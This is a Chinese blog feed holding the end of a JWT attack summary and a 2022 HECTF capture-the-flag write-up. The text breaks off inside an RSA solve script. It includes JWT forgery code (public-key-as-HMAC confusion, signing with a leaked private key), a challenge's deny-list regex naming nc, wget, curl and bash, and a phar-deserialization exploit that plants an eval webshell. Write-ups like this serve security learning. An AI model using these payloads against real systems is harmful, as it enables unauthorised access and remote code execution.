class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>python代码实现例子</p><p>不过用python跑的时候因为jwt版本过高会报错<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>解决方法：<code>pip install pyjwt==0.4.3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为<code>非对称加密算法</code>利用私钥生成<code>jwt</code>，利用公钥解密<code>jwt</code>，所以我们只要有私钥然后自己就可以重新生成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>如果运行报错<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>可以强行注释<code>node_modules\jsonwebtoken\sign.js</code>中对于密钥长度的判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-2.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://jwt.io/">jwtio</a><br><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>参考文章：<br><a href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7519&quot;&gt;RFC 7519&lt;/a&gt;)。它定义了一种紧凑且自包含的方</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="JWT" scheme="https://www.lewiserii.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>2022HECTF-WP</title>
    <link href="https://www.lewiserii.top/wp/2022HECTF.html"/>
    <id>https://www.lewiserii.top/wp/2022HECTF.html</id>
    <published>2022-11-07T01:30:00.000Z</published>
    <updated>2022-11-08T05:57:27.138Z</updated>
    
    <content type="html"><![CDATA[<p>Rank: 13</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h2><p>追踪tcp流，某个POST包中看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-1.png"></p><h2 id="舞者的秘密"><a href="#舞者的秘密" class="headerlink" title="舞者的秘密"></a>舞者的秘密</h2><p>数字暴力破解，得到密码<code>456123</code></p><p>给的后缀是png，看头实际上是gif</p><p>stegsolve一帧一帧看得到flag</p><h2 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h2><p>txt中存在0宽字符，得到<code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>docx中去除字体隐藏，得到<code>a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==</code></p><p>将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-2.png"></p><h2 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h2><p>图片补上<code>89 50 4E 47</code>，内容是zip</p><p>ocr后另存为，数字暴力破解得到<code>8686</code></p><p>解压得到<code>‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=</code></p><p>千千秀字的在线音符解密得到<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code></p><h2 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h2><p>lsb得到一串字符串<br><code>63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........</code></p><p>将字节异或51后发现恰好是<code>50 4b.....</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br>d=f.read()<br>d=d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">51</span>)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e)<br>f.close()<br></code></pre></td></tr></table></figure><p>解压后得到一个docx</p><p>将字体变成黑色得到flag</p><h2 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h2><p>问卷</p><h2 id="没大没小的鼓励"><a href="#没大没小的鼓励" class="headerlink" title="没大没小的鼓励"></a>没大没小的鼓励</h2><p><em>赛后复现</em></p><p>根据hint得知密码是<code>wocenimenma</code></p><p>进行大小写爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-1.png"></p><p>sstv得到<code>YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-2.png"></p><p>base64得到<code>b8d55688410af102549de756eb3da854</code></p><p>md5得到<code>litangdj</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h2><p>1：hebnu is a good site.</p><p>传入<code>http://121.4.119.164:32063/hebnu</code></p><p>2: Can you use another way of requesting？</p><p>post传入<code>hebnu</code></p><p>3: 来自官网的你～。～</p><p>添加<code>Referer: https://www.hebtu.edu.cn</code></p><p>4：Can you come to my house to see me?</p><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>5：Internet Explorer is the best browser！</p><p>添加<code>User-Agent: Internet Explorer</code></p><p>最后在返回包的头中得到一串js，在控制台输入得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web2-1.png"></p><h2 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web3-1.png"></p><h2 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h2><p>对show参数用伪协议读文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FROM_INDEX&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]) ? <span class="hljs-string">&#x27;home&#x27;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\./&#x27;</span>, <span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/zip/i&#x27;</span>,<span class="hljs-variable">$show</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not this !!!&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&#x27;ob_gzhandler&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page_tshow</span>(<span class="hljs-params"><span class="hljs-variable">$show</span></span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;div id=<span class="hljs-string">&quot;header&quot;</span>&gt;<br>&lt;center&gt;&lt;a href=<span class="hljs-string">&quot;?show=home&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">logo</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">images</span>/<span class="hljs-title">logo</span>.<span class="hljs-title">jpg</span>&quot; <span class="hljs-title">alt</span>=&quot;&quot;&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">body</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fatal</span>($<span class="hljs-title">msg</span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">article</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Error</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">p</span>&gt;&lt;?=$<span class="hljs-title">msg</span>;?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">exit</span>(1);</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">page_tshow</span>($<span class="hljs-title">show</span>);</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(!(<span class="hljs-title">include</span> $<span class="hljs-title">show</span> . &#x27;.<span class="hljs-title">php</span>&#x27;))</span><br><span class="hljs-class">    <span class="hljs-title">fatal</span>(&#x27;<span class="hljs-title">no</span> <span class="hljs-title">no</span> <span class="hljs-title">no</span>&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;surely exists&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;dont exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造png</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-comment">// exec($this-&gt;cmd);</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;awsl.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HeCTF</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>,<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传生成的<code>ez.png</code>，触发payload</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-1.png"></p><p>访问生成的<code>cmd.php</code>，成功rce</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-2.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><p>在线音符解密得到<code>EA&gt;N?s:WZgTdPYbMSaYg</code></p><p>将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/crypto1-1.png"></p><h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目没出好，flag直接是明文的放在文件中</p><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>先小指数爆破，得到<code>p</code>和<code>q</code>，通过<code>n/q/p</code>得到<code>t</code>。通过模不互素得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boom</span>(<span class="hljs-params">c_,n_,e_</span>):<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span>  gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">0</span>]<br>        i=i+<span class="hljs-number">1</span><br><br>p_= <span class="hljs-number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span><br>q_= <span class="hljs-number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><br>c= <span class="hljs-number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span><br>n= <span 